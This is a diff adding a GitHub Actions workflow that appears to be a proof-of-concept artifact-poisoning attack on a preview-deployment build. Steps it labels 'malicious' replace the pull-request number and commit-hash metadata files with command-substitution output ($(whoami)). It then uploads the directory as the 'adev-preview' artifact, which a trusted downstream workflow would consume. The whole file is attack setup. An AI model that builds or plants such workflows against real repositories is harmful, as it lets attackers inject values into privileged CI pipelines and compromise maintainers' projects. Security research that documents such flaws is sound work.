@@ -1,0 +1,18 @@
+name: Build adev for preview deployment
+on: [pull_request]
+
+jobs:
+  adev-build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create malicious PR number file
+        run: |
+          echo "$(whoami)" > __metadata__pull_number.txt
+      - name: Create malicious commit hash file
+        run: |
+          echo "$(whoami)" > __metadata__commit_hash.txt
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: adev-preview
+          path: .
